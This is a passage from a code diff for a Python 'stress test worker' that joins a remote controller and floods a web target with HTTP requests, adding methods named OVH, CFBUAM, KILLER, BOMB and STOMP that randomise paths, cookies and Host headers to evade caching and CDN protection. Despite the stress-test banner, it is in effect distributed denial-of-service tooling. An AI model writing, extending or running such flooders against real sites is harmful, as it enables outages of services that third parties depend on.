+                conn.request("GET", "/robots.txt", headers=headers)
+            elif method == "GSB":
+                conn.request("HEAD", f"{path}?qs={rand_str(6)}", headers=headers)
+            elif method == "RHEX":
+                conn.request("GET", f"{path}/{rand_str(random.choice([32, 64, 128]))}", headers=headers)
+            elif method == "COOKIE":
+                headers["Cookie"] = f"_ga=GA{random.randint(1000, 99999)}; {rand_str(6)}={rand_str(32)}"
+                conn.request("GET", path, headers=headers)
+            elif method == "EVEN":
+                conn.request("GET", path, headers=headers)
+                try: conn.getresponse()
+                except: pass
+            elif method == "OVH":
+                for _ in range(3):
+                    conn.request("GET", path, headers=headers)
+            elif method == "STOMP":
+                hex_path = rand_str(128)
+                headers["Host"] = f"{host}/{hex_path}"
+                conn.request("GET", f"/{hex_path}", headers=headers)
+            elif method == "KILLER":
+                for _ in range(10):
+                    conn.request("GET", path, headers=headers)
+            elif method == "DOWNLOADER":
+                conn.request("GET", path, headers=headers)
+                try:
+                    resp = conn.getresponse()
+                    resp.read()
+                except: pass
+            elif method == "BOMB":
+                for _ in range(10):
+                    conn.request("GET", path, headers=headers)
+            elif method == "AVB":
+                conn.request("GET", path, headers=headers)
+                time.sleep(max(1, random.random()))
+            elif method == "DGB":
+                conn.request("GET", path, headers=headers)
+            elif method == "CFBUAM":
+                conn.request("GET", path, headers=headers)
+                time.sleep(5)
+                for _ in range(3):
+                    conn.request("GET", path, headers=headers)
+            else:
+                conn.request("GET", path, headers=headers)
+
+            try: conn.getresponse()
+            except: pass
+            conn.close()
+
+            with counter.get_lock():
+                counter.value += 1
+        except Exception:
+            with counter.get_lock():
+                counter.value += 1
+
+
+# ══════════════════════════════════════════════════════════════════
+#  MAIN
+# ══════════════════════════════════════════════════════════════════
+
+BANNER = """
+    \033[91m
+    ╔═══════════════════════════════════════════════════════════╗
+    ║  ██     ██  ██████  ██████  ██   ██ ███████ ██████       ║
+    ║  ██     ██ ██    ██ ██   ██ ██  ██  ██      ██   ██      ║
+    ║  ██  █  ██ ██    ██ ██████  █████   █████   ██████       ║
+    ║  ██ ███ ██ ██    ██ ██   ██ ██  ██  ██      ██   ██      ║
+    ║   ███ ███   ██████  ██   ██ ██   ██ ███████ ██   ██      ║
+    ╚═══════════════════════════════════════════════════════════╝\033[0m
+    \033[96mAegisShield Stress Test Worker v4.0 (ULTIMATE)\033[0m
+    \033[93m✦ 46 Methods | L4 + L7 | Distributed\033[0m
 """
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Stress Test Worker v4")
+    multiprocessing.freeze_support()
+
+    parser = argparse.ArgumentParser(description="AegisShield Stress Test Worker v4.0")
     parser.add_argument("--master", required=True,
-                        help="Controller address (e.g. 52.53.124.44:7777)")
+                        help="Controller address (e.g. 192.168.1.10:7777)")
     args = parser.parse_args()
 
     host, port = args.master.rsplit(":", 1)
@@ -560,7 +668,7 @@ def main():
 
     print(BANNER)
     cpus = os.cpu_count() or 4
-    print(f"  CPUs: {cpus}")
+    print(f"  💻 CPUs: {cpus}")
     print(f"  🎯 Connecting to controller: {host}:{port}\n")
 
     w = StressWorker(host, port)
